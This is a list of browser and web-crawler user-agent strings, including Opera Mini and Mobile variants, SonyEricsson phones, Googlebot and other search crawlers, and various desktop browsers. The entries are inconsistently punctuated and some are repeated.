"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.394; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.11) Gecko/23.390; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (Linux; U;"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (compatible; MSIE 5.0; UNIX) Opera 6.12 [en]/24.838; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/24.705; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.60 (J2ME/MIDP; Opera Mini/4.0/490; U; en) Presto/2.2.0"
"Opera/9.80 (J2ME/MIDP; Opera Mini/3.1.10423/22.387; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/1.6.0_13/22.478; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/1.6.0_13/19.916; U; en) Presto/2.5.25Opera/9.80 (Series 60; Opera Mini/1.0.30710/29.3594; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/1.0/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/SymbianOS/22.478; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/Nokia2730c-1/22.478; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/Mozilla/23.334; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/(Windows; U; Windows NT 5.1; en-US) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54"
"Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02"
"Opera/9.80 (Android 2.3.3; Linux; Opera Mobi/ADR-1111101157; U; es-ES) Presto/2.9.201 Version/11.50"
"Opera/9.80 (S60; SymbOS; Opera Mobi/SYB-1107071606; U; en) Presto/2.8.149 Version/11.10"
"Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10"
"Opera/9.80 (Android 2.2.1; Linux; Opera Mobi/ADR-1107051709; U; pl) Presto/2.8.149 Version/11.10"
"Opera/9.80 (S60; SymbOS; Opera Mobi/SYB-1104061449; U; da) Presto/2.7.81 Version/11.00"
"Opera/9.80 (S60; SymbOS; Opera Mobi/SYB-1103211396; U; es-LA) Presto/2.7.81 Version/11.00"
"Opera/9.80 (Android; Linux; Opera Mobi/ADR-1012221546; U; pl) Presto/2.7.60 Version/10.5"
"Opera/9.80 (Android 2.2;;; Linux; Opera Mobi/ADR-1012291359; U; en) Presto/2.7.60 Version/10.5"
"Opera/9.80 (Android 2.2; Opera Mobi/ADR-2093533608; U; pl) Presto/2.7.60 Version/10.5"
"Opera/9.80 (Android 2.2; Linux; Opera Mobi/ADR-2093533312; U; pl) Presto/2.7.60 Version/10.5"
"Opera/9.80 (Android 2.2; Linux; Opera Mobi/ADR-2093533120; U; pl) Presto/2.7.60 Version/10.5"
"Opera/9.80 (Android 2.2; Linux; Opera Mobi/8745; U; en) Presto/2.7.60 Version/10.5"
"Opera/9.80 (S60; SymbOS; Opera Mobi/1209; U; sk) Presto/2.5.28 Version/10.1"
"Opera/9.80 (S60; SymbOS; Opera Mobi/1209; U; fr) Presto/2.5.28 Version/10.1"
"Opera/9.80 (S60; SymbOS; Opera Mobi/1181; U; en-GB) Presto/2.5.28 Version/10.1"
"Opera/9.80 (Android; Linux; Opera Mobi/ADR-1012211514; U; en) Presto/2.6.35 Version/10.1"
"Opera/9.80 (Android; Linux; Opera Mobi/ADR-1011151731; U; de) Presto/2.5.28 Version/10.1"
"Opera/9.80 (S60; SymbOS; Opera Mobi/498; U; sv) Presto/2.4.18 Version/10.00"
"Opera/9.80 (S60; SymbOS; Opera Mobi/447; U; en) Presto/2.4.18 Version/10.00"
"Mozilla/4.0 (compatible; Windows Mobile; WCE; Opera Mobi/WMD-50433; U; de) Presto/2.4.13 Version/10.00"
"Opera/9.80 (Windows NT 6.1; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00"
"Opera/9.80 (Windows NT 6.0; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00"
"Opera/9.80 (Windows NT 5.1; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00"
"Opera/9.80 (Windows Mobile; WCE; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00"
"Opera/9.80 (Macintosh; Intel Mac OS X; Opera Mobi/3730; U; en) Presto/2.4.18 Version/10.00"
"Opera/9.80 (Macintosh; Intel Mac OS X; Opera Mobi/27; U; en) Presto/2.4.18 Version/10.00"
"Opera/9.80 (Linux i686; Opera Mobi/1040; U; en) Presto/2.5.24 Version/10.00"
"Opera/9.80 (Linux i686; Opera Mobi/1038; U; en) Presto/2.5.24 Version/10.00"
"Opera/9.80 (Android; Linux; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00"
"Opera/9.80 (Android; Linux; Opera Mobi/27; U; en) Presto/2.4.18 Version/10.00"
"Mozilla/5.0 (S60; SymbOS; Opera Mobi/SYB-1103211396; U; es-LA; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00"
"Mozilla/5.0 (S60; SymbOS; Opera Mobi/1209; U; it; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.1"
"Mozilla/5.0 (S60; SymbOS; Opera Mobi/1181; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.1"
"Mozilla/5.0 (Linux armv7l; Maemo; Opera Mobi/4; U; fr; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.1"
"Mozilla/5.0 (Linux armv6l; Maemo; Opera Mobi/8; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00"
"Mozilla/4.0 (compatible; MSIE 8.0; S60; SymbOS; Opera Mobi/SYB-1107071606; en) Opera 11.10"
"Mozilla/4.0 (compatible; MSIE 8.0; Linux armv7l; Maemo; Opera Mobi/4; fr) Opera 10.1"
"Mozilla/4.0 (compatible; MSIE 8.0; Linux armv6l; Maemo; Opera Mobi/8; en-GB) Opera 11.00"
"Mozilla/4.0 (compatible; MSIE 8.0; Android 2.2.2; Linux; Opera Mobi/ADR-1103311355; en) Opera 11.00"
"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonW800c/R1L Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonW800c/R1BC Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonW800c/R1AA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonW700c/R1DB Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonW700c/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK750c/R1DB Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK750c/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK750c/R1BC Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK700c/R2CA SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK700c/R2AE SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK500c/R2AT SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK300c/R2BA SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonJ300c/R2BA SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK506c/R2AA SEMC-Browser/4.0.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonS700i/R3B SEMC-Browser/4.0.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonS700c/R3B SEMC-Browser/4.0.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK500c/R2L SEMC-Browser/4.0.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/418.9.1 (KHTML, like Gecko) Safari/419.3 TeaShark/0.8"
"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_USA)"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_KO_KTF)"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZard/1.0; Server_KO_SKT)"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_HK)"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_EN)"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_CN)"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)"
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"Googlebot/2.1 (+http://www.google.com/bot.html)"
"Googlebot-News"
"Googlebot-Image/1.0"
"Googlebot-Video/1.0"
"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
"DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)"
"Mediapartners-Google"
"AdsBot-Google (+http://www.google.com/adsbot.html)"
"Baiduspider+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
"zspider/0.9-dev http://feedback.redkolibri.com/",
"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
"TheSuBot/0.2 (www.thesubot.de)",
"TheSuBot/0.1 (www.thesubot.de)",
"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.x Multimedia",
"Mozilla/4.0 (compatible: FDSE robot)",
"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)"
"AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0",
"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
"msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
"msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
"msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
"Mozilla/5.0 (compatible; mxbot/1.0;  http://www.chainn.com/mxbot.html)",
"NetResearchServer/4.0(loopimprovements.com/robot.html)",
"NetResearchServer/3.5(loopimprovements.com/robot.html)",
"NetResearchServer/2.8(loopimprovements.com/robot.html)",
"NetResearchServer/2.7(loopimprovements.com/robot.html)",
"NetResearchServer/2.5(loopimprovements.com/robot.html)",
"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)",
"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET ",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
"Opera/9.20 (Windows NT 6.0; U; en)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
"Opera/9.20 (Windows NT 6.0; U; en)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
"Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; InfoPath.1; .NET CLR 2.0.50727; Media Center PC 3.0; InfoPath.2)"
"AmigaVoyager/2.95 (compatible; MC680x0; AmigaOS; SV1)"
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
"Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Avant Browser; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable"
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Browzar)"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre) Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)"
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko, Safari) Cheshire/1.0.UNOFFICIAL"
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA"
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20030111 Chimera/0.6"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15"
"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"
"Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11"
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1"
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41"
"Mozilla/5.0 ArchLinux (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1"
"Mozilla/5.0 (X11; Linux amd64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
"Mozilla/5.0 (Macintosh; U; PPC; en-US; mimic; rv:9.3.0) Gecko/20120117 Firefox/3.6.25 Classilla/CFM"
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.5) Gecko/2009011615 Firefox/3.0.5 CometBird/3.0.5"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.30 (KHTML, like Gecko) Comodo_Dragon/12.1.0.0 Chrome/12.0.742.91 Safari/534.30"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20101209 Conkeror/0.9.2 (Debian-0.9.2+git100804-1)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 3.0.5) ; .NET CLR 3.0.04506.30; InfoPath.2; InfoPath.3; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)"
"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Crazy Browser 1.x.x)"
"Cyberdog/2.0 (Macintosh; PPC)"
"Cyberdog/2.0 (Macintosh; 68k)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Deepnet Explorer 1.5.3; Smart 2x2; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
